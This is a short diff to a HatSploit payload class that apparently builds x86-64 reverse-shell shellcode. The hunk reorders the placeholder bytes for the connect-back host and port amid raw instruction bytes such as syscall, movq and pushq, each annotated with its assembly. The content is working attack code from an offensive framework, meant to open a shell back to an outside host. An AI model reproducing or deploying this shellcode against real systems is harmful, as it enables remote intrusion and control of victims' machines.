@@ -87,8 +87,8 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             b"\x0f\x05"          # syscall
             b"\x49\x89\xc4"      # movq	 %rax, %r12
             b"\x49\xbd\x01\x01"  # movabsq  $-2750349055, %r13
-            b":lport:ip:"        # host
-            b":lport:port"       # port
+            b":lport:port:"      # port
+            b":lhost:ip:"        # host
             b"\x41\xb1\xff"      # movb  $-1, %r9b
             b"\x4d\x29\xcd"      # subq	 %r9, %r13
             b"\x41\x55"          # pushq  %r13
